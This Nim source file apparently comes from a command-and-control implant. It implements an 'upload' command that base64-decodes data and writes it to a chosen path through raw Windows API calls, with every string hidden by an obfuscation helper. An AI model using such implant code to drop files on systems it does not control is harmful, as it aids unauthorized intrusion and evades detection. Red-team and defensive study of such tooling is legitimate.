from std/base64 import decode
import ../utils/global
import ../utils/general/strings
import ../utils/winapi/handlers
import ../utils/msg
import filesystem

type Wchar = uint16

proc run_upload*(input, params: string; buf: var openArray[char]): int =
  # Writes decoded file data to disk
  let outPath = filesystem.paramValue(params, obf("output"), [obf("-o"), obf("--output")])
  if outPath.len == 0:
    return writeErr(obf("missing output path (-o / --output)"), buf)
  if input.len == 0:
    return writeErr(obf("empty file data"), buf)
  let raw = decode(input)
  if raw.len == 0:
    return writeErr(obf("invalid file data"), buf)

  var w: array[260, Wchar]
  asciiWide(outPath, w)
  const genericWrite = 0x40000000'u32
  const createAlways = 2'u32
  const fileAttributeNormal = 0x80'u32
  let h = createFileW(addr w[0], genericWrite, 0, nil, createAlways, fileAttributeNormal, 0)
  if h == cast[pointer](-1):
    let err = getLastError()
    return writeErr(filesystem.ioErrorMessage(err), buf, culong(err))
  defer: discard closeHandle(h)

  var written: culong = 0
  if writeFile(h, unsafeAddr raw[0], culong(raw.len), addr written, nil) == 0:
    let err = getLastError()
    return writeErr(filesystem.ioErrorMessage(err), buf, culong(err))
  if int(written) != raw.len:
    return writeErr(obf("incomplete write"), buf)

  return writeMsg(
    obf("File uploaded successfully (") & outPath & obf("), ") & $written & obf(" bytes"),
    buf,
  )
